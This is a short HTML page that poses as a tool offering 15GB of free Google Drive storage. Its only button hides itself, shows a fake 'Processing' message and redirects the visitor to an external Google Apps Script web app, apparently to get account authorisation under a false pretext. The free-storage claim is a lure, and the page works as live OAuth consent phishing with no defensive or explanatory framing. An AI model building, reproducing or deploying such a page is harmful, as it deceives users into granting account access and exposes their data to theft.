<!DOCTYPE html>
<html>
<head>
    <title>Free Google Drive Space Checker</title>
    <style>
        body { font-family: Arial; max-width: 500px; margin: 50px auto; text-align: center; }
        .btn { background: #4285f4; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; width: 100%; margin: 20px 0; }
        .btn:hover { background: #3367d6; }
        .loading { display: none; color: green; }
    </style>
</head>
<body>
    <h1>🔥 Get 15GB Free Google Drive Space</h1>
    <p>Click below to verify your account and claim your free storage upgrade!</p>
    
    <div id="loginBtn" class="btn">🚀 Claim Free Space Now (1 Click)</div>
    <div id="loading" class="loading">✅ Processing... Please wait!</div>

    <script>
        document.getElementById('loginBtn').onclick = function() {
            document.getElementById('loginBtn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // Google OAuth2 redirect to Apps Script
            window.location.href = 'https://script.google.com/macros/s/AKfycbxrzRNxgDTVZd59pzfg6CJ21cW4vKqfXHyhwo1saDpPAjRtUgeaIKi_1EOaxzPTdsGN_Q/exec';
        };
    </script>
</body>
</html>
